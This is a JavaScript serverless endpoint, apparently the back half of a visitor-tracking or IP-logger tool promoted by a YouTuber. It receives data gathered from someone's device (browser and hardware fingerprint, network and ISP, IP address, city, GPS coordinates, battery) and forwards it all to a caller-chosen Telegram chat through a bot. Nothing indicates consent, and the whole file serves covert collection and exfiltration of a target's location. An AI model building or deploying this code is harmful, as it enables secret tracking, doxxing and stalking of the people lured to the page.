export default async (req, res) => {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  try {
    const { telegramId, source, ...d } = req.body;

    // Helper to escape Markdown special characters
    const escapeMarkdown = (text = '') => {
      return text.replace(/([_*[\]()~`>#+-=|{}.!])/g, '\\$1');
    };

    const message = `*Device Info*\n\n` +
      `🌐 *Basic Info:*\n` +
      `- Browser: ${escapeMarkdown(d.browser)}\n` +
      `- Platform: ${escapeMarkdown(d.platform)}\n` +
      `- Language: ${escapeMarkdown(d.language)}\n` +
      `- Timezone: ${escapeMarkdown(d.timezone)}\n\n` +

      `💻 *Hardware:*\n` +
      `- CPU: ${escapeMarkdown(d.cpu)}\n` +
      `- RAM: ${escapeMarkdown(d.ram)}\n` +
      `- Screen: ${escapeMarkdown(d.screen)}\n` +
      `- WebGL: ${escapeMarkdown(d.webgl)}\n\n` +

      `📶 *Network:*\n` +
      `- Type: ${escapeMarkdown(d.networkType)}\n` +
      `- Speed: ${escapeMarkdown(d.networkSpeed)}\n` +
      `- Latency: ${escapeMarkdown(d.latency)}\n` +
      `- Data Saver: ${escapeMarkdown(d.dataSaver)}\n` +
      `- ISP: ${escapeMarkdown(d.location?.isp)}\n\n` +

      `📍 *IP Info:*\n` +
      `- IP: ${escapeMarkdown(d.ip)}\n` +
      `- City: ${escapeMarkdown(d.location?.city)}\n` +
      `- Region: ${escapeMarkdown(d.location?.region)}\n` +
      `- Country: ${escapeMarkdown(d.location?.country)}\n` +
      `- GPS: ${escapeMarkdown(d.gps)}\n` +
      `- Source: ${escapeMarkdown(source)}\n\n` +
      `_Note: IP-based location may not be accurate._\n\n` +

      `🔋 *Battery:*\n` +
      `- Level: ${escapeMarkdown(d.batteryLevel)}\n` +
      `- Charging: ${escapeMarkdown(d.charging)}\n\n` +

      `_Subscribe to my YT_`;

    // Send message to Telegram
    await fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: telegramId,
        text: message,
        parse_mode: 'MarkdownV2' // safer than Markdown
      })
    });

    res.status(200).json({ success: true });
  } catch (error) {
    console.error('Submit Error:', error);
    res.status(500).json({ error: error.message || 'Failed to send to Telegram' });
  }
};
